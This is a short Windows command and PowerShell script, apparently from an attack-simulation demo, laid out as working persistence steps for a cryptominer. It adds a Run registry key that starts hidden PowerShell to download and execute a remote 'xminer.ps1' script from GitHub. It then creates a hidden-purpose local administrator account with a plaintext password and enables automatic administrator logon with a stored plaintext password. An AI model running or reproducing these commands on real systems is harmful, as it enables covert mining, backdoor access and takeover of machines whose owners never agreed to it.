
cmd.exe /c "reg.exe add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v ""xMiner"" /t REG_SZ /d ""C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/tmmdemo/automate/master/xminer.ps1'))"" /f"

cmd.exe /c "net user miner Mining4Ever! /add"
cmd.exe /c "net localgroup Administrators miner /add"


$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
$DefaultUsername = "demo"
$DefaultPassword = "Crowdstrike2017!"
Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String

